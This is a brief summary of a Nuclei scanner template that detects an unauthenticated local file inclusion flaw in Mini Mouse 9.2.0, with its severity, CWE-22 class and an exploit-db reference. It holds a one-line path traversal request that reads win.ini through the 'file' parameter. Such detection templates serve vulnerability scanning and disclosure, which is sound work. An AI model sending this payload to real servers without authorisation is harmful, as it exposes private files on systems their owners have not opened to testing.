# Nuclei Template: Mini Mouse 9.2.0 - Local File Inclusion
**Template ID:** minimouse-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`minimouse-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Mini Mouse 9.2.0 is vulnerable to local file inclusion because it allows remote unauthenticated attackers to include and disclose the content of locally stored files via the 'file' parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/file=C:%5CWindows%5Cwin.ini
```

## References
- https://www.exploit-db.com/exploits/49744
